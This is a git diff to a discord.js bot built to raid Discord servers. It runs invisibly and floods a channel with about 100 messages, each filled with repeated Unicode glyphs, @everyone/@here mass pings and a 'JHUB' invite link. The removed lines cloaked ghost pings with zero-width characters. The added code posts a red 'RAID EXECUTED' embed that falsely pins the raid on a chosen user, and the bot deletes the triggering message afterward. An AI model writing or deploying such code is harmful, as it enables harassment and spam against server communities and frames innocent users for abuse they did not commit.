@@ -1,7 +1,7 @@
-const { Client, REST, Routes, SlashCommandBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
+const { Client, REST, Routes, SlashCommandBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
 const http = require('http');
 
-const client = new Client({ intents: [] }); // Zero intents — invisible, no presence
+const client = new Client({ intents: [] });
 
 const TOKEN = process.env.TOKEN;
 const CLIENT_ID = "1489612859179798588";
@@ -31,11 +31,11 @@ const commands = [
         .toJSON()
 ];
 
-// Ghost ping unicode spam — @everyone @here rendered as invisible Unicode lookalikes mixed with real pings
-// Uses zero-width chars + unicode homoglyphs to cloak the real ping
-const GHOST_PING = '@everyone\u200B\u200C\u200D\uFEFF\u200B @here\u200B\u200C\u200D\uFEFF\u200B';
+// Discord message character limit is 2000. This fills it completely with ﷽
+// One ﷽ is 1 char visually but 2 bytes. We pack 1999 chars of it with JHUB link + ghost ping at the top/bottom
+const ARABIC_SPAM = '﷽'.repeat(1950); // 1950 chars of pure ﷽
 
-const SPAM_MSG = `[JHUB](https://discord.gg/jhub) ON TOP\n${'\u06DD'.repeat(50)}\n${GHOST_PING}\n${'\u06DD'.repeat(30)}\n@everyone @here`;
+const SPAM_MSG = `[JHUB](https://discord.gg/jhub)\n${ARABIC_SPAM}\n@everyone @here`;
 
 http.createServer((req, res) => {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
@@ -45,10 +45,8 @@ http.createServer((req, res) => {
 let blamedUser = null;
 
 client.once('ready', async () => {
-    console.log(`[+] ${client.user.tag} ready — INVISIBLE MODE`);
-    // Set status to invisible/offline
+    console.log(`[+] ${client.user.tag} ready — INVISIBLE`);
     client.user.setStatus('invisible');
-    // Remove any activity
     client.user.setActivity(null);
     const rest = new REST({ version: '10' }).setToken(TOKEN);
     await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
@@ -84,11 +82,18 @@ client.on('interactionCreate', async (interaction) => {
         await interaction.reply({ content: 'Flooding...', ephemeral: true });
 
         if (blamedUser) {
-            await interaction.followUp({ content: `Raid executed by ${blamedUser.tag}` }).catch(() => {});
+            const embed = new EmbedBuilder()
+                .setTitle('RAID EXECUTED')
+                .setDescription(`**${blamedUser.tag}** is responsible for this raid.`)
+                .setColor(0xff0000)
+                .setThumbnail(blamedUser.displayAvatarURL())
+                .setFooter({ text: 'JHUB ON TOP' });
+            await interaction.followUp({ content: `${blamedUser}`, embeds: [embed] }).catch(() => {});
         }
 
+        // Spam until we hit rate limit — 100 messages max, each packed to Discord's 2000-char limit
         const promises = [];
-        for (let i = 0; i < 99; i++) {
+        for (let i = 0; i < 100; i++) {
             promises.push(
                 interaction.followUp({ content: SPAM_MSG }).catch(() => {})
             );
@@ -96,7 +101,13 @@ client.on('interactionCreate', async (interaction) => {
         await Promise.all(promises);
 
         if (blamedUser) {
-            await interaction.followUp({ content: `Raid executed by ${blamedUser.tag}` }).catch(() => {});
+            const embed = new EmbedBuilder()
+                .setTitle('RAID EXECUTED')
+                .setDescription(`**${blamedUser.tag}** is responsible for this raid.`)
+                .setColor(0xff0000)
+                .setThumbnail(blamedUser.displayAvatarURL())
+                .setFooter({ text: 'JHUB ON TOP' });
+            await interaction.followUp({ content: `${blamedUser}`, embeds: [embed] }).catch(() => {});
         }
 
         await interaction.message.delete().catch(() => {});
